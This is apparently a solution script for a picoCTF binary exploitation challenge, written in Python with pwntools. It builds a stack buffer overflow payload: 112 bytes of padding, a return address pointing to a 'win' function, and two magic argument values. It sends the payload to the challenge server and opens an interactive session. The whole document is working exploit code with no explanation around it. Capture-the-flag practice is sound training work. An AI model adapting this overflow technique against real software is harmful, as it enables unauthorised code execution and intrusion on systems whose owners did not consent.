from pwn import *

HOST = "saturn.picoctf.net"  # actual host
PORT = 56960                 # actual port

padding = b"A" * 112
win_addr = p32(0x08049296)
ret_after_win = b"BBBB"           # Dummy return address
arg1 = p32(0xCAFEF00D)            # param_1
arg2 = p32(0xF00DF00D)            # param_2

payload = padding + win_addr + ret_after_win + arg1 + arg2

p = remote(HOST, PORT)
p.sendline(payload)
p.interactive()